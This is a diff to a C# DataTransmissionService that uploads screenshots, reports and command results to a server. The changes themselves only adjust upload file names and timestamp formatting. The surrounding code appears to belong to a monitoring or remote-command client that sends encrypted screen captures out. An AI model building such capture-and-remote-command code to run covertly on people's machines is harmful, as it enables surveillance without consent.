@@ -266,18 +266,18 @@ public class DataTransmissionService : IDataTransmissionService
             }
 
             bool sent = false;
-            var destPending = Path.Combine(_pendingScreenshots, Path.GetFileName(filePath));
+            var now = DateTime.Now;
+            var sendName = $"{_settings.ClientId}_{now:yyyy-MM-ddTHH-mm-ss.fff}.jpg";
+            var destPending = Path.Combine(_pendingScreenshots, sendName);
 
             using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read))
             using (var streamContent = GetEncryptedStreamContent(fileStream))
             using (var content = new MultipartFormDataContent())
             {
-                var now = DateTime.Now;
-                var sendName = $"{_settings.ClientId}_{now:yyyy-MM-ddTHH-mm-ss.fff}.jpg";
                 content.Add(streamContent, "screenshot", sendName);
                 content.Add(new StringContent(_settings.ClientId), "clientId");
                 // Send Local Time exactly as is (no Z, no offset)
-                content.Add(new StringContent(now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
+                content.Add(new StringContent(now.ToString("yyyy-MM-ddTHH:mm:ss.fff", System.Globalization.CultureInfo.InvariantCulture)), "timestamp");
 
                 var response = await PostWithAutoDiscoverAsync("screenshots", content);
                 
@@ -306,8 +306,13 @@ public class DataTransmissionService : IDataTransmissionService
         catch (Exception ex)
         {
             _logger.LogError(ex, "Error sending screenshot: {FilePath}", filePath);
-            var dest = Path.Combine(_pendingScreenshots, Path.GetFileName(filePath));
-            try { if (File.Exists(filePath)) File.Move(filePath, dest, true); } catch { }
+            try 
+            { 
+                var now = DateTime.Now;
+                var sendName = $"{_settings.ClientId}_{now:yyyy-MM-ddTHH-mm-ss.fff}.jpg";
+                var dest = Path.Combine(_pendingScreenshots, sendName);
+                if (File.Exists(filePath)) File.Move(filePath, dest, true); 
+            } catch { }
             _ = Task.Run(async () => { try { await FlushPendingAsync(); } catch { } });
         }
     }
@@ -491,7 +496,7 @@ public class DataTransmissionService : IDataTransmissionService
             {
                 content.Add(streamContent, "report", Path.GetFileName(reportPath));
                 content.Add(new StringContent(_settings.ClientId), "clientId");
-                content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
+                content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff", System.Globalization.CultureInfo.InvariantCulture)), "timestamp");
 
                 var response = await PostWithAutoDiscoverAsync("reports", content);
                 
@@ -565,7 +570,7 @@ public class DataTransmissionService : IDataTransmissionService
             if (!response.IsSuccessStatusCode)
             {
                 _logger.LogWarning("Failed to send command result json. Status: {StatusCode}", response.StatusCode);
-                var name = Path.Combine(_pendingCmdJson, $"cmd_{commandId}_{DateTime.UtcNow:yyyyMMdd_HHmmss_fff}.json");
+                var name = Path.Combine(_pendingCmdJson, $"cmd_{commandId}_{DateTime.Now:yyyyMMdd_HHmmss_fff}.json");
                 try { await File.WriteAllBytesAsync(name, jsonBytes); } catch { }
             }
             else
@@ -576,7 +581,7 @@ public class DataTransmissionService : IDataTransmissionService
         catch (Exception ex)
         {
             _logger.LogError(ex, "Error sending command result json");
-            try { var name = Path.Combine(_pendingCmdJson, $"cmd_{commandId}_{DateTime.UtcNow:yyyyMMdd_HHmmss_fff}.json"); await File.WriteAllBytesAsync(name, jsonBytes); } catch { }
+            try { var name = Path.Combine(_pendingCmdJson, $"cmd_{commandId}_{DateTime.Now:yyyyMMdd_HHmmss_fff}.json"); await File.WriteAllBytesAsync(name, jsonBytes); } catch { }
         }
     }
 
@@ -597,7 +602,7 @@ public class DataTransmissionService : IDataTransmissionService
             {
                 content.Add(streamContent, "file", Path.GetFileName(filePath));
                 content.Add(new StringContent(_settings.ClientId), "clientId");
-                content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff", System.Globalization.CultureInfo.InvariantCulture)), "timestamp");
 
                 response = await PostWithAutoDiscoverAsync($"commands/{commandId}/result", content);
             }
@@ -765,10 +770,11 @@ public class DataTransmissionService : IDataTransmissionService
                     {
                         var sendName = Path.GetFileName(file);
                         var timestamp = TryExtractTimestampFromFileName(sendName) ?? File.GetCreationTime(file);
+                        var uploadName = $"{_settings.ClientId}_{timestamp:yyyy-MM-ddTHH-mm-ss.fff}.jpg";
                         
-                        content.Add(streamContent, "screenshot", sendName);
+                        content.Add(streamContent, "screenshot", uploadName);
                         content.Add(new StringContent(_settings.ClientId), "clientId");
-                        content.Add(new StringContent(timestamp.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
+                        content.Add(new StringContent(timestamp.ToString("yyyy-MM-ddTHH:mm:ss.fff", System.Globalization.CultureInfo.InvariantCulture)), "timestamp");
                         
                         var resp = await PostWithAutoDiscoverAsync("screenshots", content);
                         
@@ -801,7 +807,7 @@ public class DataTransmissionService : IDataTransmissionService
                     {
                         content.Add(streamContent, "report", Path.GetFileName(file));
                         content.Add(new StringContent(_settings.ClientId), "clientId");
-                        content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
+                        content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff", System.Globalization.CultureInfo.InvariantCulture)), "timestamp");
                         var resp = await PostWithAutoDiscoverAsync("reports", content);
                         
                         if (resp.IsSuccessStatusCode) 
@@ -898,7 +904,7 @@ public class DataTransmissionService : IDataTransmissionService
                         {
                             content.Add(streamContent, "file", Path.GetFileName(file));
                             content.Add(new StringContent(_settings.ClientId), "clientId");
-                            content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
+                            content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff", System.Globalization.CultureInfo.InvariantCulture)), "timestamp");
                             var resp = await PostWithAutoDiscoverAsync($"commands/{cmdId}/result", content);
                             if (resp.IsSuccessStatusCode) 
                             {
